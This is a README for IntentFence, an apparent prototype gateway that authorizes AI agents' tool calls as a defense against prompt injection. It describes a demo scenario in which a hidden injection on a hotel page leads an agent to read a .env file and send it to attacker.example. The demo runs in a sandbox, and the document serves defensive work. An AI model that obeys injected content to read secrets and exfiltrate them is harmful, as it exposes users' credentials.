# IntentFence

**Runtime authorization for autonomous AI agents.** IntentFence converts a user's delegated objective into a typed Intent Contract and places a fail-closed authorization boundary in front of protected agent actions.

[![CI](https://github.com/rajeet-04/INTENTFENCE/actions/workflows/ci.yml/badge.svg)](https://github.com/rajeet-04/INTENTFENCE/actions/workflows/ci.yml)
[![License: AGPL-3.0](https://img.shields.io/badge/License-AGPL--3.0-blue.svg)](LICENSE)

## Problem statement

Autonomous agents can browse untrusted content and then invoke high-impact tools with the user's credentials. Prompt injection can exploit that path: a malicious page may ask an agent to read secrets, send data elsewhere, or take actions the user never authorized. Prompt-only defenses are not a reliable security boundary because the same model is asked both to interpret untrusted text and police its own behavior.

## Solution

IntentFence separates reasoning from authorization. It compiles the user's objective into a strict, versioned Intent Contract and places a protected-tool gateway between agent reasoning and execution. Deterministic policy, stateful action-chain analysis, purpose-bound data flow, and semantic relevance are implemented behind typed boundaries. The `/authorize` path integrates deterministic policy and state, while the protected-tool gateway now composes the canonical Phase 2 policy, Phase 3 state, and Phase 4 data-flow engines before any optional semantic evaluation. Hard rules remain authoritative, and uncertainty fails closed to approval instead of silently executing.

The current prototype includes the shared contracts, deterministic policy and classification, stateful authorization, purpose-bound data-flow controls, semantic intent evaluation, the protected-tool gateway, sanitized Action Receipts/security events, a FastAPI surface, a dashboard shell, and a controlled before/after prompt-injection demo.

## Integration milestone

**Phases 1–4 are integrated on `main`** and form the current merged security baseline:

1. **Phase 1 — Foundation:** strict shared contracts, API boundaries, persistence primitives, and fail-closed validation.
2. **Phase 2 — Deterministic security:** resource/destination classification, policy rules, hard blocks, approval rules, and risk aggregation.
3. **Phase 3 — Stateful authorization:** bounded security context, action-chain analysis, accumulated risk, and intent-drift signals.
4. **Phase 4 — Purpose-bound data flow:** provenance-aware labels, controlled propagation, destination constraints, and fail-closed egress enforcement.

The protected-tool gateway uses the canonical Phase 2 policy, Phase 3 state, and Phase 4 data-flow adapters. Phase 5 semantic evaluation and Phase 6 gateway/demo capabilities remain implemented prototype layers built on this integrated baseline.

## Submission snapshot

| Module | Status | Evidence |
| --- | --- | --- |
| Typed Intent Contracts and security models | Implemented | `packages/contracts` |
| Resource, destination, and authority classification | Implemented; used by `/authorize` and gateway | `packages/classification` |
| Deterministic fail-closed policy | Implemented; used by `/authorize` and gateway | `packages/policy` |
| Stateful action-chain authorization | Implemented; used by `/authorize` and gateway | `packages/state` |
| Purpose-bound data-flow enforcement | Implemented and integrated into the gateway | `packages/dataflow` |
| Local/hybrid semantic intent layer | Implemented; Ollama optional | `apps/api/src/intentfence_api/semantic` |
| Protected-tool interception and receipts | Implemented with canonical Phase 2–4 deterministic enforcement | `apps/api/src/intentfence_api/gateway` |
| Golden hotel prompt-injection comparison | Implemented | `POST /demo/hotel-attack` |
| Security dashboard | Prototype shell | `apps/dashboard` |
| Automated verification | 233 backend tests plus lint, typecheck, and production build | `make verify` and `.github/workflows/ci.yml` |

Deployment is intentionally out of scope for this evaluation round; the repository runs locally and is designed to be directly reviewable.

## Tech stack

- Python 3.12, FastAPI, Pydantic, SQLAlchemy, HTTPX, Pytest, and Ruff
- Next.js 15, React 19, and TypeScript
- uv for Python/runtime management and Bun for dashboard dependencies/scripts
- SQLite for local persistence and optional Ollama for local semantic evaluation

## Security invariants

- Intent may narrow authority; it never expands it.
- External content cannot grant authority.
- Data may influence reasoning; data cannot grant authority.
- Deterministic hard blocks remain authoritative and cannot be overridden by semantic or cloud models.
- Protected tools execute only through the IntentFence gateway when protection is enabled.
- Semantic timeout, malformed output, low confidence without escalation, or provider failure fail closed to `REQUIRE_APPROVAL`.
- Sensitive gateway paths fail closed when a required security component is unavailable.
- Raw chain-of-thought, raw provider output, raw tool payloads, and secret-bearing request values are not part of receipts or analytics events.

## Contract and authorization guarantees

- Every shared security object is validated with strict Pydantic models.
- Unknown contract fields are rejected.
- Contract versions must be at least 1.
- Risk, confidence, and drift scores are constrained to `[0, 1]`.
- `/authorize` blocks session mismatches, intent mismatches, and expired Intent Contracts.
- External content is represented as source context, not authorization authority.
- Action Receipts and SecurityContext state can be persisted through SQLite.
- `/authorize` evaluates the integrated deterministic policy and state engine.
- The semantic layer remains advisory and cannot replace deterministic authorization.

## Phase 5 semantic intent layer

Phase 5 provides:

- strict `SemanticEvaluation` results with `ALLOW`, `BLOCK`, or `REQUIRE_APPROVAL` recommendations;
- compact semantic context containing the active objective, authorization boundaries, action metadata, state indicators, and data labels without arbitrary full history or raw secret-bearing values;
- a structured semantic judge that validates provider JSON and fails closed on timeout, malformed output, or provider errors;
- an Ollama adapter for local inference;
- optional local-to-cloud semantic escalation through an injected cloud judge;
- a high-risk escalation guard so cloud semantic alignment cannot convert high-risk approval state into `ALLOW`;
- a versioned Intent Contract compiler and revision path;
- a stable operator-facing semantic summary containing only the decision hint, reason, relevance, confidence, source, model, latency, and escalation state.

## Phase 6 interception gateway

Phase 6 exposes exactly five protected core tools:

- `browse_web`
- `read_file`
- `write_file`
- `send_message`
- `http_request`

The gateway normalizes every protected request into the shared `ToolRequest` contract, enriches it with resource and destination metadata, composes policy/state-data-flow adapter signals and an optional semantic signal, executes the handler only after `ALLOW`, and emits both an `ActionReceipt` and metadata-only `SecurityEvent`.

Decision precedence is intentionally conservative:

1. deterministic or state/data-flow hard `BLOCK`;
2. any other deterministic/state `BLOCK`;
3. deterministic/state `REQUIRE_APPROVAL`;
4. semantic decision only after deterministic layers allow;
5. final `ALLOW` only after the relevant checks clear.

A semantic `ALLOW` cannot override a hard block or approval requirement.

The default gateway now uses dedicated adapters for the canonical Phase 2 deterministic policy and the composed Phase 3 state plus Phase 4 data-flow engines. Controlled data references resolve through the Phase 4 registry and fail closed when unknown or duplicated. Semantic evaluation is invoked only when every deterministic layer returns `ALLOW`. `BaselineSecurityAdapter` remains as a focused compatibility/test fixture rather than the default enforcement path.

### Golden hotel attack

`POST /demo/hotel-attack` runs one immutable scenario twice with the same protected-tool sequence:

```text
browse_web(hotel-a)
browse_web(hotel-b with hidden injection)
read_file(.env)
http_request(attacker.example)
write_file(workspace/hotel-choice.txt)
```

With `IntentFence` disabled, the controlled secret-read and exfiltration handlers are reached. With `IntentFence` enabled, the malicious path is stopped before the protected handler executes, while the legitimate hotel comparison still reaches the final safe write.

The demo stores only data references such as `data-secret`. It does not place a real credential in the scenario, receipt, event, or API response.

### Sandboxed protected runtime

The HTTP API uses `SandboxProtectedToolRuntime` for CI and hackathon demonstrations. It implements the five protected tool surfaces without performing real network, messaging, or filesystem side effects. Real integrations can replace injected handlers behind the same `IntentFenceGateway.intercept(...)` boundary.

## Local semantic model

Ollama is optional and is **not required by CI**. The local adapter can be configured with these environment variables:

```text
INTENTFENCE_SEMANTIC_OLLAMA_BASE_URL=http://localhost:11434
INTENTFENCE_SEMANTIC_OLLAMA_MODEL=qwen2.5:7b
INTENTFENCE_SEMANTIC_TIMEOUT_SECONDS=5
```

The same defaults are included in `.env.example`. Runtime wiring can load them through the typed application settings:

```python
from intentfence_api.config import get_settings
from intentfence_api.semantic import OllamaProvider, StructuredSemanticJudge

provider = OllamaProvider.from_settings(get_settings())
judge = StructuredSemanticJudge(provider)
```

Direct constructor configuration remains available for tests and deployment-specific overrides:

```python
provider = OllamaProvider(
    base_url="http://localhost:11434",
    model="qwen2.5:7b",
    timeout_seconds=5.0,
)
```

Tests use `httpx.MockTransport`; they never contact a live model server. A cloud provider is also optional. `HybridSemanticJudge` accepts an injected cloud judge and escalates only when local confidence is below the configured threshold.

## Versioned Intent Contracts

`IntentContractDraft` accepts only user-authorized contract fields. Unknown fields, including external-content instructions, are rejected. Compiling a draft produces contract version 1. Revising a contract:

- preserves the session ID;
- creates a new intent ID;
- increments `contract_version`;
- links `previous_intent_id` to the prior contract;
- replaces authority with the newly delegated boundaries rather than inheriting authority from external content.

## Security analytics contract

Phase 6 security events are designed to feed Phase 7 explainability and Phase 8 metrics without raw sensitive payloads. Reproducible event definitions, KPI formulas, ground-truth joins, disabled-demo exclusions, and latency guardrails are documented in `docs/phase-6-analytics-contract.md`.

## Repository structure

```text
apps/
  api/          FastAPI authorization, semantic, and gateway runtime
  dashboard/    Next.js dashboard foundation
packages/
  contracts/    Shared typed security contracts
  classification/ Resource, destination, and authority classification
  policy/       Deterministic authorization rules and risk aggregation
  state/        Stateful action-chain authorization and drift signals
  dataflow/     Purpose-bound labels, propagation, and egress constraints
docs/
  phase-6-analytics-contract.md
  superpowers/  Approved architecture and execution plans
```

## Prerequisites

- [uv](https://docs.astral.sh/uv/) (provisions Python 3.12 automatically)
- [Bun](https://bun.com/) 1.4.0 (the version pinned in CI)

## Quick start

```bash
make setup
cp .env.example .env
make dev-api
```

In a second terminal:

```bash
make dev-dashboard
```

The API is available at `http://127.0.0.1:8000`, interactive API documentation at `http://127.0.0.1:8000/docs`, and the dashboard at `http://localhost:3000`.

Health check:

```bash
curl http://127.0.0.1:8000/health
```

Expected response:

```json
{"status":"ok","service":"intentfence-api"}
```

Run the controlled hotel comparison demo:

```bash
curl -X POST http://127.0.0.1:8000/demo/hotel-attack
```

The response runs the same five-step tool sequence with protection disabled and enabled. Review `secret_read_executed`, `exfiltration_executed`, `legitimate_workflow_completed`, decisions, receipt IDs, and sanitized security events to see the enforcement difference.

## Manual setup

Backend:

```bash
uv python install 3.12
uv venv --python 3.12 .venv
uv pip install --python .venv/bin/python \
  -e ./packages/contracts \
  -e ./packages/classification \
  -e ./packages/policy \
  -e ./packages/state \
  -e "./packages/dataflow[dev]" \
  -e "./apps/api[dev]"
```

Dashboard:

```bash
cd apps/dashboard
bun install --frozen-lockfile
bun run dev
```

By default the dashboard probes `http://localhost:8000/health`. Override it with `NEXT_PUBLIC_API_BASE_URL` when needed. Ollama and all cloud providers are optional; the automated tests do not make external model calls.

## Verification

Run the same gates used by CI:

```bash
make verify
```

Verified on 2026-08-22: 233 backend tests passing; backend lint, SQLite initialization, API health smoke, dashboard lint, TypeScript checks, and the optimized Next.js production build complete successfully.

Phase 6 focused tests:

```bash
.venv/bin/python -m pytest apps/api/tests/test_gateway_models.py \
  apps/api/tests/test_gateway_tools.py \
  apps/api/tests/test_gateway_precedence.py \
  apps/api/tests/test_gateway_baseline.py \
  apps/api/tests/test_gateway_service.py \
  apps/api/tests/test_gateway_demo.py \
  apps/api/tests/test_gateway_api.py -q
```

Semantic tests cover compact context, strict result validation, timeout/malformed/provider failure handling, Ollama request/response behavior, typed environment configuration, hybrid escalation, high-risk approval preservation, contract versioning, and operator-facing summaries.

## API surface

### `GET /health`

Returns the fixed service health payload.

### `POST /authorize`

Accepts:

- `ToolRequest`
- `IntentContract`
- `SecurityContext`

Returns a typed fail-closed `Decision` from the integrated deterministic policy and state engine. The dedicated gateway surface handles protected-tool execution and receipt emission.

### `POST /gateway/intercept`

Accepts:

- `ToolRequest`
- `IntentContract`
- `SecurityContext`
- optional `DataLabel[]`
- `GatewayMode`
- optional `scenario_id`

Returns `GatewayExecution`, which includes the final decision, execution state, sanitized result metadata, `ActionReceipt`, and `SecurityEvent`.

### `POST /demo/hotel-attack`

Runs the shared golden attack once with protection disabled and once with protection enabled. The response exposes matching tool sequences, decisions, receipt IDs, events, whether the malicious handlers executed, and whether the legitimate workflow completed.

## Shared contracts

The shared contract package exports:

- `IntentContract`
- `ToolRequest`
- `DataLabel`
- `SecurityContext`
- `Decision`
- `ActionReceipt`

These interfaces are the stable boundary consumed by policy, state, data-flow, semantic, gateway, benchmark, and console phases.

## Branch convention

Feature work:

```text
<github-user>/phase-<n>-feat-<slug>
```

Bug fixes:

```text
<github-user>/phase-<n>-bug-<slug>
```

Example:

```text
rajeet/phase-6-feat-gateway
```

## Development rule

Security implementation is merged serially through reviewed pull requests. Parallel phase work may expose stable interfaces, but final authorization precedence is integrated only after its dependency phases are available and the full CI gate is green.
